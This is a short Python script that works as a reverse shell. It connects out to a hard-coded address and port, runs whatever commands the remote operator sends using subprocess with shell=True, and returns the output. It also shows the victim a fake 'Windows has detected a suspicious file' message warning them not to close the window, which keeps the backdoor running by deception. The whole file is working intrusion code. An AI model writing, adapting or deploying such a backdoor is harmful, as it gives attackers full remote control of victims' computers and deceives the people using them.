import socket
import os
import subprocess
import time

IP = '192.168.1.25'  # TODO: make my ip static!!
PORT = 8778


def main():
    main_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    main_socket.connect((IP, PORT))
    print("Windows has detected a suspicious file on your system and trying to remove it right now. "
          "Please do not close "
          "this window or you will damage your computer.")
    try:
        while True:
            global cwd
            cwd = os.getcwd()
            main_socket.sendall((cwd + '>').encode())
            # wait for command:
            command = main_socket.recv(1024).decode()
            # execute command:
            split_command = command.split(" ")
            # Shell=true gives us additional shell privileges
            if split_command[0] != 'cd':
                output = subprocess.Popen(split_command, stdout=subprocess.PIPE, cwd=cwd, shell=True).communicate()[0]
                if output.decode() != '':
                    main_socket.sendall(output)
                else:  # for commands with no output
                    main_socket.sendall("don't_display".encode())

            elif (len(split_command) > 1) and split_command[0] == 'cd':
                # update the current working directory and update the global variable
                os.chdir(split_command[1])
                cwd = os.getcwd()
                main_socket.sendall("don't_display".encode())
            elif split_command[0] == 'cd' and len(split_command) == 1:
                main_socket.sendall((cwd + '\n').encode())
    except KeyboardInterrupt:
        main_socket.close()


if __name__ == '__main__':
    main()
